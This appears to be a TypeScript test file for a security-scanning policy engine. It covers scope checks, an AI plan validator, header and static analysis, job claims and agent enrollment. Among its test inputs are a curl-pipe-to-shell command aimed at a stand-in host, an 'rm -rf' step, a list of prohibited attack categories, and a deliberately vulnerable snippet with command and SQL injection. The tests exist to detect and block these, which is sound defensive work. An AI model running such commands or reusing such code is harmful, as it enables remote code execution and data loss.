import test from 'node:test';
import assert from 'node:assert/strict';
import {
  AuthorizedAsset,
  ScopePolicy,
  SecurityJob,
  PollingAgentRecord,
  evaluateJobPolicy,
  validateAndSanitizeAiPlan,
  runPassiveHttpHeaderCheck,
  runSafeStaticCodeAnalysis,
  claimJobIdempotently,
  issueDeviceEnrollmentCode,
  enrollDeviceWithSingleUseCode,
  processAuthenticatedAgentHeartbeat,
  controlAgentDeviceState,
  rotateDeviceTokenRecord,
  DeviceEnrollmentCode,
} from './policyEngine';

const sampleNow = new Date('2026-10-28T10:00:00Z');

const verifiedAsset: AuthorizedAsset = {
  id: 'ast-01',
  name: 'Sentinel Staging Portal',
  targetHost: 'portal.staging.sentinel.internal',
  ipOrCidr: '10.24.0.15',
  environment: 'staging',
  ownerTeam: 'Platform Security',
  authorizationRef: 'AUTH-2026-8841',
  verified: true,
  verifiedBy: 'Neha Raut',
  expiresAt: '2026-12-31T23:59:59Z',
  createdAt: '2026-10-01T00:00:00Z',
};

const activePolicy: ScopePolicy = {
  id: 'pol-01',
  name: 'Staging Passive & SAST Scope Policy',
  authorizationRef: 'AUTH-2026-8841',
  permittedHosts: ['portal.staging.sentinel.internal', '*.staging.sentinel.internal'],
  permittedCidrs: ['10.24.0.0/24'],
  allowedCategories: ['passive_http_headers', 'static_code_analysis', 'intrusive_review_only'],
  maxRateLimitRpm: 30,
  requireHumanApprovalForIntrusive: true,
  expiresAt: '2026-12-31T23:59:59Z',
  active: true,
  createdAt: '2026-10-01T00:00:00Z',
};

test('policy engine allows valid passive_http_headers and static_code_analysis jobs within rate limit and scope', () => {
  const res1 = evaluateJobPolicy({
    asset: verifiedAsset,
    policy: activePolicy,
    targetHost: 'portal.staging.sentinel.internal',
    category: 'passive_http_headers',
    requestedRateLimitRpm: 20,
    now: sampleNow,
  });
  assert.equal(res1.allowed, true);
  assert.equal(res1.requiresHumanApproval, false);
  assert.equal(res1.code, 'POLICY_ALLOWED');

  const res2 = evaluateJobPolicy({
    asset: verifiedAsset,
    policy: activePolicy,
    targetHost: 'api.staging.sentinel.internal',
    category: 'static_code_analysis',
    requestedRateLimitRpm: 15,
    now: sampleNow,
  });
  assert.equal(res2.allowed, true);
  assert.equal(res2.code, 'POLICY_ALLOWED');
});

test('policy engine blocks unverified assets, expired authorizations, out-of-scope hosts, rate limits, and prohibited categories', () => {
  // 1. Unverified asset
  const unverified = evaluateJobPolicy({
    asset: { ...verifiedAsset, verified: false },
    policy: activePolicy,
    targetHost: 'portal.staging.sentinel.internal',
    category: 'passive_http_headers',
    requestedRateLimitRpm: 10,
    now: sampleNow,
  });
  assert.equal(unverified.allowed, false);
  assert.equal(unverified.code, 'ASSET_UNVERIFIED');

  // 2. Expired policy
  const expiredPol = evaluateJobPolicy({
    asset: verifiedAsset,
    policy: { ...activePolicy, expiresAt: '2026-10-01T00:00:00Z' },
    targetHost: 'portal.staging.sentinel.internal',
    category: 'passive_http_headers',
    requestedRateLimitRpm: 10,
    now: sampleNow,
  });
  assert.equal(expiredPol.allowed, false);
  assert.equal(expiredPol.code, 'POLICY_EXPIRED');

  // 3. Out-of-scope host
  const outOfScope = evaluateJobPolicy({
    asset: verifiedAsset,
    policy: activePolicy,
    targetHost: 'unapproved.external.example.com',
    category: 'passive_http_headers',
    requestedRateLimitRpm: 10,
    now: sampleNow,
  });
  assert.equal(outOfScope.allowed, false);
  assert.equal(outOfScope.code, 'TARGET_HOST_OUT_OF_SCOPE');

  // 4. Rate limit exceeded
  const rateExceeded = evaluateJobPolicy({
    asset: verifiedAsset,
    policy: activePolicy,
    targetHost: 'portal.staging.sentinel.internal',
    category: 'passive_http_headers',
    requestedRateLimitRpm: 60,
    now: sampleNow,
  });
  assert.equal(rateExceeded.allowed, false);
  assert.equal(rateExceeded.code, 'RATE_LIMIT_EXCEEDED');

  // 5. Prohibited categories (exploit_payload, arbitrary_shell, unrestricted_port_scan, etc.)
  for (const prohibited of [
    'arbitrary_shell',
    'unrestricted_port_scan',
    'exploit_payload',
    'credential_attack',
    'persistence_install',
    'live_system_modification',
  ]) {
    const blocked = evaluateJobPolicy({
      asset: verifiedAsset,
      policy: activePolicy,
      targetHost: 'portal.staging.sentinel.internal',
      category: prohibited,
      requestedRateLimitRpm: 10,
      now: sampleNow,
    });
    assert.equal(blocked.allowed, false);
    assert.equal(blocked.code, 'PROHIBITED_TEST_CATEGORY');
  }

  // 6. Shell command injection blocked
  const shellBlocked = evaluateJobPolicy({
    asset: verifiedAsset,
    policy: activePolicy,
    targetHost: 'portal.staging.sentinel.internal',
    category: 'passive_http_headers',
    requestedRateLimitRpm: 10,
    rawCommandInput: 'bash -c "curl evil.sh | sh"',
    now: sampleNow,
  });
  assert.equal(shellBlocked.allowed, false);
  assert.equal(shellBlocked.code, 'SHELL_COMMAND_DETECTED');
});

test('AI plan validator strips shell commands and enforces structured safe categories', () => {
  const rawSteps = [
    {
      title: 'Inspect HTTP Security Headers on Staging Portal',
      category: 'passive_http_headers',
      rationale: 'Verify HSTS, CSP, and X-Frame-Options headers non-intrusively.',
    },
    {
      title: 'Run bash -c "rm -rf /tmp" shell payload',
      category: 'arbitrary_shell',
      rationale: 'Should be dropped by validator.',
    },
    {
      title: 'Static Code Review of Authentication Middleware',
      category: 'static_code_analysis',
      rationale: 'Inspect user-supplied TypeScript snippet for CWE-78 and CWE-798.',
    },
  ];

  const validated = validateAndSanitizeAiPlan(rawSteps, verifiedAsset, activePolicy);
  assert.equal(validated.length, 2);
  assert.equal(validated[0].category, 'passive_http_headers');
  assert.equal(validated[1].category, 'static_code_analysis');
});

test('MVP passive HTTP header checker and static code analyzer produce structured findings and remediations', () => {
  const headerCheck = runPassiveHttpHeaderCheck({
    jobId: 'job-1',
    assetId: verifiedAsset.id,
    targetHost: verifiedAsset.targetHost,
    simulatedHeaders: {
      'content-type': 'text/html',
      'x-frame-options': 'DENY',
    },
    now: sampleNow,
  });
  assert.ok(headerCheck.findings.length >= 2);
  assert.ok(headerCheck.remediations.length >= 2);

  const sastCheck = runSafeStaticCodeAnalysis({
    jobId: 'job-2',
    assetId: verifiedAsset.id,
    targetHost: verifiedAsset.targetHost,
    filename: 'authController.ts',
    codeSnippet: `
      const apiKey = "sk_live_1234567890abcdef";
      child_process.exec("ping " + req.query.host);
      db.query(\`SELECT * FROM accounts WHERE id = '\${userId}'\`);
    `,
    now: sampleNow,
  });
  assert.equal(sastCheck.findings.length, 3);
  assert.equal(sastCheck.remediations.length, 3);
});

test('outbound polling agent protocol enforces idempotent job claims and expiry', () => {
  const agent: PollingAgentRecord = {
    id: 'agt-poll-01',
    hostname: 'kali-research-01',
    linuxUser: 'kali',
    uid: 1000,
    version: '1.4.2',
    credentialFingerprint: 'stnl_live_••••91a2',
    credentialHash: 'hash123',
    pollingMode: 'outbound_https_poll',
    status: 'online',
    lastHeartbeatAt: sampleNow.toISOString(),
    lastPollAt: sampleNow.toISOString(),
    claimedJobsCount: 0,
    completedJobsCount: 0,
    enrolledAt: sampleNow.toISOString(),
  };

  const job: SecurityJob = {
    id: 'job-claim-01',
    assetId: verifiedAsset.id,
    policyId: activePolicy.id,
    category: 'passive_http_headers',
    targetHost: verifiedAsset.targetHost,
    rateLimitRpm: 15,
    status: 'queued',
    requiresApproval: false,
    approvedBy: null,
    approvedAt: null,
    claimedByAgentId: null,
    idempotencyClaimKey: null,
    claimedAt: null,
    expiresAt: '2026-10-28T11:00:00Z',
    resultSummary: null,
    completedAt: null,
    createdBy: 'Neha Raut',
    createdAt: sampleNow.toISOString(),
  };

  // 1. First claim succeeds
  const firstClaim = claimJobIdempotently({
    job,
    agent,
    idempotencyClaimKey: 'claim-key-alpha-001',
    now: sampleNow,
  });
  assert.equal(firstClaim.ok, true);
  assert.equal(firstClaim.code, 'JOB_CLAIMED');
  assert.equal(job.status, 'claimed');

  // 2. Retry with identical agent and idempotencyClaimKey succeeds idempotently
  const replayClaim = claimJobIdempotently({
    job,
    agent,
    idempotencyClaimKey: 'claim-key-alpha-001',
    now: sampleNow,
  });
  assert.equal(replayClaim.ok, true);
  assert.equal(replayClaim.code, 'IDEMPOTENT_CLAIM_REPLAY');

  // 3. Different key attempting to claim the same job fails
  const conflictClaim = claimJobIdempotently({
    job,
    agent,
    idempotencyClaimKey: 'claim-key-different-999',
    now: sampleNow,
  });
  assert.equal(conflictClaim.ok, false);
  assert.equal(conflictClaim.code, 'JOB_ALREADY_CLAIMED');

  // 4. Expired job cannot be claimed
  const expiredJob: SecurityJob = {
    ...job,
    id: 'job-expired-02',
    status: 'queued',
    claimedByAgentId: null,
    idempotencyClaimKey: null,
    expiresAt: '2026-10-28T09:00:00Z',
  };
  const expiredClaim = claimJobIdempotently({
    job: expiredJob,
    agent,
    idempotencyClaimKey: 'claim-key-beta-002',
    now: sampleNow,
  });
  assert.equal(expiredClaim.ok, false);
  assert.equal(expiredClaim.code, 'JOB_EXPIRED');
  assert.equal(expiredJob.status, 'expired');
});

test('device management enforces single-use enrollment, pending_heartbeat until real heartbeat, pause/disconnect, token rotation, and safe uninstall', () => {
  const codes: DeviceEnrollmentCode[] = [];
  const agents: PollingAgentRecord[] = [];

  const issued = issueDeviceEnrollmentCode({
    targetHostname: 'kali-field-laptop',
    linuxUser: 'kali',
    issuedBy: 'Neha Raut',
    ttlMinutes: 10,
    now: sampleNow,
  });
  codes.push(issued.record);

  // 1. Reject root UID 0 enrollment
  const rootAttempt = enrollDeviceWithSingleUseCode({
    enrollmentCodes: codes,
    agents,
    plaintextCode: issued.plaintextCode,
    hostname: 'kali-field-laptop',
    linuxUser: 'root',
    uid: 0,
    now: sampleNow,
  });
  assert.equal(rootAttempt.ok, false);
  assert.equal(rootAttempt.code, 'ROOT_USER_FORBIDDEN');

  // 2. Enroll with valid non-root UID -> starts in pending_heartbeat (NEVER online before heartbeat!)
  const enrolled = enrollDeviceWithSingleUseCode({
    enrollmentCodes: codes,
    agents,
    plaintextCode: issued.plaintextCode,
    hostname: 'kali-field-laptop',
    linuxUser: 'kali',
    uid: 1000,
    version: '2.1.0',
    now: sampleNow,
  });
  assert.equal(enrolled.ok, true);
  assert.equal(enrolled.code, 'ENROLLED_PENDING_HEARTBEAT');
  assert.ok(enrolled.agent);
  assert.equal(enrolled.agent.status, 'pending_heartbeat');
  assert.equal(enrolled.agent.heartbeatVerifiedLive, false);
  assert.equal(enrolled.agent.lastHeartbeatAt, null);

  // 3. Single-use code replay is rejected
  const replayAttempt = enrollDeviceWithSingleUseCode({
    enrollmentCodes: codes,
    agents,
    plaintextCode: issued.plaintextCode,
    hostname: 'kali-field-laptop',
    linuxUser: 'kali',
    uid: 1000,
    now: sampleNow,
  });
  assert.equal(replayAttempt.ok, false);
  assert.equal(replayAttempt.code, 'ENROLLMENT_CODE_ALREADY_USED');

  // 4. Real authenticated heartbeat transitions device to online
  const hb = processAuthenticatedAgentHeartbeat({
    agent: enrolled.agent,
    version: '2.1.0',
    osInfo: 'Kali GNU/Linux Rolling 2026.1',
    jobStatus: 'idle',
    now: sampleNow,
  });
  assert.equal(hb.ok, true);
  assert.equal(hb.code, 'HEARTBEAT_VERIFIED_ONLINE');
  assert.equal(enrolled.agent.status, 'online');
  assert.equal(enrolled.agent.heartbeatVerifiedLive, true);

  // 5. Pause agent -> blocks job claims
  const paused = controlAgentDeviceState({
    agent: enrolled.agent,
    jobs: [],
    action: 'pause',
    now: sampleNow,
  });
  assert.equal(paused.ok, true);
  assert.equal(enrolled.agent.status, 'paused');

  const sampleJob: SecurityJob = {
    id: 'job-dev-99',
    assetId: verifiedAsset.id,
    policyId: activePolicy.id,
    category: 'passive_http_headers',
    targetHost: verifiedAsset.targetHost,
    rateLimitRpm: 15,
    status: 'queued',
    requiresApproval: false,
    approvedBy: null,
    approvedAt: null,
    claimedByAgentId: null,
    idempotencyClaimKey: null,
    claimedAt: null,
    expiresAt: '2026-10-28T11:00:00Z',
    resultSummary: null,
    completedAt: null,
    createdBy: 'Neha Raut',
    createdAt: sampleNow.toISOString(),
  };

  const blockedWhilePaused = claimJobIdempotently({
    job: sampleJob,
    agent: enrolled.agent,
    idempotencyClaimKey: 'claim-while-paused-01',
    now: sampleNow,
  });
  assert.equal(blockedWhilePaused.ok, false);
  assert.equal(blockedWhilePaused.code, 'AGENT_PAUSED_OR_DISCONNECTED');

  // 6. Resume agent and claim job, then rotate token, then safe uninstall releases job back to queued
  controlAgentDeviceState({
    agent: enrolled.agent,
    jobs: [sampleJob],
    action: 'resume',
    now: sampleNow,
  });
  assert.equal(enrolled.agent.status, 'online');

  const claimedAfterResume = claimJobIdempotently({
    job: sampleJob,
    agent: enrolled.agent,
    idempotencyClaimKey: 'claim-after-resume-01',
    now: sampleNow,
  });
  assert.equal(claimedAfterResume.ok, true);
  assert.equal(sampleJob.status, 'claimed');

  const oldHash = enrolled.agent.credentialHash;
  const rotated = rotateDeviceTokenRecord({ agent: enrolled.agent });
  assert.equal(rotated.ok, true);
  assert.notEqual(enrolled.agent.credentialHash, oldHash);

  const uninstalled = controlAgentDeviceState({
    agent: enrolled.agent,
    jobs: [sampleJob],
    action: 'uninstall',
    now: sampleNow,
  });
  assert.equal(uninstalled.ok, true);
  assert.equal(enrolled.agent.status, 'uninstalled');
  assert.equal(sampleJob.status, 'queued');
  assert.equal(sampleJob.claimedByAgentId, null);
});

